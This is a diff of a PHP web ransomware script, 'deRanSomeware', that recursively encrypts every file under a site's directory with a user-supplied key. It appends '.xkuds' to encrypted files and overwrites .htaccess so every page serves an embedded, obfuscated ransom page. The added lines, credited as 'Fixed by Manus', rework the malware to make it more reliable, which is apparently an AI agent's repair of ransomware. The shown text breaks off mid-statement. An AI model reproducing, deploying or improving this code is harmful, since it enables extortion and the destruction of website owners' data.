@@ -1,158 +1,357 @@
 <?php
-echo "
-	<style type='text/css'>
-	.inpute{
-	border-style: solid;
-	border-color: #379600;
-	background-color: transparent;
-	color: white;
-	text-align: center;
-	}
-	.selecte{
-	border-style: solid;
-	border-color: green;
-	background-color: transparent;
-	color: green;
-	}
-	.submite{
-	border-style: solid;
-	border-color: #4CAF50;
-	background-color: transparent;
-	color: white;
-	}
-	.result{
-	text-align: left;
-	}
-	</style>
-	<link rel='stylesheet' type='text/css' href='https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css'>
-	</head>
-	<body background-color='black'>
-	<div class='result'>";
-	error_reporting(0);
-	set_time_limit(0);
-	ini_set('memory_limit', '-1');
-	class deRanSomeware{
-		public function shcpackInstall(){
-			if(!file_exists(".htaXkuds")){
-				rename(".htaccess", ".htaXkuds");
-				if(fwrite(fopen('.htaccess', 'w+'), "\rDirectoryIndex enc.php\r\nErrorDocument 404 /enc.php")){
-					echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i> .htaccess (Default Page)<br>';
-				}
-				if(file_put_contents("enc.php", gzinflate(base64_decode("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")))){
-					echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i>  enc.php (Default Page)<br>';
-				}
-			}
-		}
-		public function shcpackUnstall(){
-			if(file_exists(".htaXkuds")){
-				if(unlink(".htaccess") && unlink("enc.php")){
-					echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> .htaccess (Default Page)<br>';
-					echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> enc.php (Default Page)<br>';
-				}
-				rename(".htaXkuds", ".htaccess");
-			}
-		}
-		public function plus(){
-			flush();
-			ob_flush();
-		}
-		public function locate(){
-			return getcwd();
-		}
-		public function shcdirs($dir, $method, $key){
-			switch($method){
-				case '1':
-				deRanSomeware::shcpackInstall();
-				break;
-				case '2':
-				deRanSomeware::shcpackUnstall();
-				break;
-			}
-			foreach(scandir($dir) as $d){
-				if($d != '.' && $d != '..'){
-					$locate = $dir . DIRECTORY_SEPARATOR . $d;
-					if(!is_dir($locate)){
-						if(deRanSomeware::kecuali($locate, "robots.php") && deRanSomeware::kecuali($locate, "ransom.php") && deRanSomeware::kecuali($locate, ".htaccess") && deRanSomeware::kecuali($locate, "index.php") && deRanSomeware::kecuali($locate, "enc.php") && deRanSomeware::kecuali($locate, ".htaXkuds")){
-							switch($method){
-								case '1':
-								deRanSomeware::shcEnCry($key, $locate);
-								deRanSomeware::shcEnDesDirS($locate, "1");
-								break;
-								case '2':
-								deRanSomeware::shcDeCry($key, $locate);
-								deRanSomeware::shcEnDesDirS($locate, "2");
-								break;
-							}
-						}
-					} else{
-						deRanSomeware::shcdirs($locate, $method, $key);
-					}
-				}
-				deRanSomeware::plus();
-			}
-		}
-		public function shcEnDesDirS($locate, $method){
-			switch($method){
-				case '1':
-				rename($locate, $locate . ".xkuds");
-				break;
-				case '2':
-				$locates = str_replace(".xkuds", "", $locate);
-				rename($locate, $locates);
-				break;
-			}
-		}
-		public function shcEnCry($key, $locate){
-			$data      = file_get_contents($locate);
-			$iv        = mcrypt_create_iv(mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC), MCRYPT_DEV_URANDOM);
-			$encrypted = base64_encode($iv . mcrypt_encrypt(MCRYPT_RIJNDAEL_128, hash('sha256', $key, true), $data, MCRYPT_MODE_CBC, $iv));
-			if(file_put_contents($locate, $encrypted)){
-				echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">' . $locate . '</font> <br>';
-			} else{
-				echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> ' . $locate . ' <br>';
-			}
-		}
-		public function shcDeCry($key, $locate){
-			$data      = base64_decode(file_get_contents($locate));
-			$iv        = substr($data, 0, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC));
-			$decrypted = rtrim(mcrypt_decrypt(MCRYPT_RIJNDAEL_128, hash('sha256', $key, true), substr($data, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC)), MCRYPT_MODE_CBC, $iv), "\0");
-			if(file_put_contents($locate, $decrypted)){
-				echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">' . $locate . '</font> <br>';
-			} else{
-				echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> <font color="#2196F3">' . $locate . '</font> <br>';
-			}
-		}
-		public function kecuali($ext, $name){
-			$re = "/({$name})/";
-			preg_match($re, $ext, $matches);
-			if($matches[1]){
-				return false;
-			}
-			return true;
-		}
-	}
-	if($_POST['submit']){
-		switch($_POST['method']){
-			case '1':
-			deRanSomeware::shcdirs(deRanSomeware::locate(), "1", $_POST['key']);
-			break;
-			case '2':
-			deRanSomeware::shcdirs(deRanSomeware::locate(), "2", $_POST['key']);
-			break;
-		}
-	} else{
-		echo "
-		<form action='' method='post' style='text-align: center;'>
-		<label>Key : </label>
-		<input type='text' name='key' class='inpute' placeholder='KEY ENC/DEC'>
-		<select name='method' class='selecte'>
-		<option value='1'>Encrypt</option>
-		<option value='2'>Decrypt</option>
-		</select>
-		<input type='submit' name='submit' class='submite' value='Submit'>
-		</form>";
-	}
-	echo "
-	</div>
-	</body>";
+error_reporting(E_ALL);
+ini_set('display_errors', 0);
+set_time_limit(0);
+ini_set('memory_limit', '-1');
+
+class deRanSomeware {
+    /**
+     * Coded by Mr.xBarakuda
+     * Fixed by Manus
+     */
+
+    public static function shcpackInstall() {
+        $results = [];
+        // FIX: Cek apakah .htaXkuds sudah ada — jika sudah, artinya sudah pernah di-install, skip
+        if (!file_exists(".htaXkuds")) {
+            // FIX: Hanya backup .htaccess jika file tersebut memang ada
+            if (file_exists(".htaccess")) {
+                rename(".htaccess", ".htaXkuds");
+            } else {
+                // Jika .htaccess tidak ada, buat file kosong sebagai placeholder
+                file_put_contents(".htaXkuds", "");
+            }
+
+            // FIX: Tambahkan pengecekan apakah .htaccess berhasil dibuat
+            $content = "\rDirectoryIndex enc.php\r\nErrorDocument 404 /enc.php";
+            if (file_put_contents('.htaccess', $content) !== false) {
+                $results[] = ['type' => 'success', 'msg' => '.htaccess (Default Page) created successfully.'];
+            } else {
+                $results[] = ['type' => 'error', 'msg' => '.htaccess creation failed.'];
+            }
+
+            // FIX: Tambahkan pengecekan apakah enc.php berhasil ditulis
+            $base64_data = "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";
+            $enc_content = gzinflate(base64_decode($base64_data));
+            if ($enc_content !== false && file_put_contents("enc.php", $enc_content) !== false) {
+                $results[] = ['type' => 'success', 'msg' => 'enc.php (Default Page) created successfully.'];
+            } else {
+                $results[] = ['type' => 'error', 'msg' => 'enc.php creation failed.'];
+            }
+        }
+        return $results;
+    }
+
+    public static function shcpackUnstall() {
+        $results = [];
+        if (file_exists(".htaXkuds")) {
+            // FIX: Hapus enc.php terlebih dahulu sebelum memodifikasi .htaccess
+            if (file_exists("enc.php")) {
+                unlink("enc.php");
+                $results[] = ['type' => 'success', 'msg' => 'Removed enc.php.'];
+            }
+
+            // FIX: Hapus .htaccess yang trap (bukan yang asli)
+            if (file_exists(".htaccess")) {
+                unlink(".htaccess");
+            }
+
+            // FIX: Restore .htaccess asli dari backup .htaXkuds
+            if (rename(".htaXkuds", ".htaccess")) {
+                $results[] = ['type' => 'info', 'msg' => 'Restored original .htaccess and removed trap files.'];
+            } else {
+                // FIX: Jika rename gagal (misal .htaccess sudah ada), coba unlink dulu
+                if (file_exists(".htaccess")) unlink(".htaccess");
+                if (rename(".htaXkuds", ".htaccess")) {
+                    $results[] = ['type' => 'info', 'msg' => 'Restored original .htaccess and removed trap files.'];
+                } else {
+                    $results[] = ['type' => 'error', 'msg' => 'Failed to restore .htaccess from backup.'];
+                }
+            }
+        } else {
+            $results[] = ['type' => 'error', 'msg' => 'No backup (.htaXkuds) found. Cannot restore.'];
+        }
+        return $results;
+    }
+
+    public static function shcdirs($dir, $method, $key) {
+        $logs = [];
+
+        // FIX: Pastikan instalasi/uninstall dilakukan di direktori utama sebelum rekursi
+        if ($dir === getcwd()) {
+            if ($method == '1') {
+                $logs = array_merge($logs, self::shcpackInstall());
+            } elseif ($method == '2') {
+                $logs = array_merge($logs, self::shcpackUnstall());
+            }
+        }
+
+        $files = scandir($dir);
+        if ($files === false) {
+            return $logs;
+        }
+
+        foreach ($files as $d) {
+            if ($d == '.' || $d == '..') continue;
+            $locate = $dir . DIRECTORY_SEPARATOR . $d;
+
+            if (!is_dir($locate)) {
+                $basename = basename($locate);
+
+                // FIX: Tambahkan proteksi untuk file yang sudah ter-encrypt (.xkuds)
+                // dan file hasil decrypt yang mungkin sudah diproses
+                $protected = [
+                    "robots.php",
+                    "ransom.php",
+                    ".htaccess",
+                    "index.php",
+                    "enc.php",
+                    ".htaXkuds",
+                    basename(__FILE__)
+                ];
+
+                // FIX: Saat encrypt (method 1), skip file yang sudah memiliki ekstensi .xkuds
+                // untuk mencegah double encryption
+                if ($method == '1' && substr($basename, -6) === ".xkuds") {
+                    continue;
+                }
+
+                // FIX: Saat decrypt (method 2), skip file yang TIDAK memiliki ekstensi .xkuds
+                // karena berarti file tersebut belum pernah di-encrypt oleh script ini
+                if ($method == '2' && substr($basename, -6) !== ".xkuds") {
+                    continue;
+                }
+
+                if (!in_array($basename, $protected)) {
+                    if ($method == '1') {
+                        $logs[] = self::shcEnCry($key, $locate);
+                        // FIX: Rename dilakukan SETELAH encrypt berhasil
+                        self::shcEnDesDirS($locate, "1");
+                    } elseif ($method == '2') {
+                        // FIX: Decrypt dulu, lalu rename (hapus ekstensi .xkuds)
+                        self::shcEnDesDirS($locate, "2");
+                        // FIX: Decrypt file yang sudah di-rename ke nama aslinya
+                        $originalName = substr($locate, 0, -6);
+                        $logs[] = self::shcDeCry($key, $originalName);
+                    }
+                }
+            } else {
+                $logs = array_merge($logs, self::shcdirs($locate, $method, $key));
+            }
+        }
+        return $logs;
+    }
+
+    public static function shcEnDesDirS($locate, $method) {
+        if ($method == '1') {
+            // FIX: Tambahkan pengecekan apakah file yang akan di-rename masih ada
+            if (file_exists($locate) && substr($locate, -6) !== ".xkuds") {
+                if (rename($locate, $locate . ".xkuds")) {
+                    return true;
+                }
+                return false;
+            }
+        } elseif ($method == '2') {
+            // FIX: Cek apakah file memang punya ekstensi .xkuds sebelum rename
+            if (file_exists($locate) && substr($locate, -6) === ".xkuds") {
+                $new_name = substr($locate, 0, -6);
+                // FIX: Cek apakah nama target sudah ada untuk menghindari overwrite
+                if (!file_exists($new_name)) {
+                    if (rename($locate, $new_name)) {
+                        return true;
+                    }
+                } else {
+                    // FIX: Jika target sudah ada, hapus yang lama dan rename
+                    unlink($new_name);
+                    if (rename($locate, $new_name)) {
+                        return true;
+                    }
+                }
+            }
+        }
+        return false;
+    }
+
+    public static function shcEnCry($key, $locate) {
+        if (!function_exists('mcrypt_encrypt')) {
+            return ['type' => 'error', 'msg' => "Locked (Failed: mcrypt extension missing) | $locate"];
+        }
+
+        // FIX: Tambahkan pengecekan apakah file yang akan di-encrypt masih ada
+        if (!file_exists($locate)) {
+            return ['type' => 'error', 'msg' => "Locked (Failed: file not found) | $locate"];
+        }
+
+        $data = file_get_contents($locate);
+        if ($data === false) {
+            return ['type' => 'error', 'msg' => "Locked (Failed: cannot read file) | $locate"];
+        }
+
+        $iv_size = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);
+        $iv = mcrypt_create_iv($iv_size, MCRYPT_DEV_URANDOM);
+        $encrypted = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, hash('sha256', $key, true), $data, MCRYPT_MODE_CBC, $iv);
+
+        // FIX: Simpan IV + encrypted data dalam base64
+        $encoded = base64_encode($iv . $encrypted);
+        if (file_put_contents($locate, $encoded) !== false) {
+            return ['type' => 'success', 'msg' => "Locked (Success) | $locate"];
+        }
+        return ['type' => 'error', 'msg' => "Locked (Failed) | $locate"];
+    }
+
+    public static function shcDeCry($key, $locate) {
+        if (!function_exists('mcrypt_decrypt')) {
+            return ['type' => 'error', 'msg' => "Unlock (Failed: mcrypt extension missing) | $locate"];
+        }
+
+        // FIX: Tambahkan pengecekan apakah file yang akan di-decrypt masih ada
+        if (!file_exists($locate)) {
+            return ['type' => 'error', 'msg' => "Unlock (Failed: file not found) | $locate"];
+        }
+
+        $raw_data = file_get_contents($locate);
+        if ($raw_data === false) {
+            return ['type' => 'error', 'msg' => "Unlock (Failed: cannot read file) | $locate"];
+        }
+
+        $data = base64_decode($raw_data, true);
+        // FIX: Cek apakah base64_decode berhasil
+        if ($data === false) {
+            return ['type' => 'error', 'msg' => "Unlock (Failed: invalid base64 data) | $locate"];
+        }
+
+        $iv_size = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);
+
+        // FIX: Cek apakah data cukup panjang untuk mengandung IV
+        if (strlen($data) < $iv_size) {
+            return ['type' => 'error', 'msg' => "Unlock (Failed: data too short) | $locate"];
+        }
+
+        $iv = substr($data, 0, $iv_size);
+        $decrypted = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, hash('sha256', $key, true), substr($data, $iv_size), MCRYPT_MODE_CBC, $iv);
+        $decrypted = rtrim($decrypted, "\0");
+
+        if (file_put_contents($locate, $decrypted) !== false) {
+            return ['type' => 'success', 'msg' => "Unlock (Success) | $locate"];
+        }
+        return ['type' => 'error', 'msg' => "Unlock (Failed) | $locate"];
+    }
+}
+
+$output_logs = [];
+if (isset($_POST['submit'])) {
+    $key = $_POST['key'] ?? '';
+    $method = $_POST['method'] ?? '1';
+    if (!empty($key)) {
+        $output_logs = deRanSomeware::shcdirs(getcwd(), $method, $key);
+    } else {
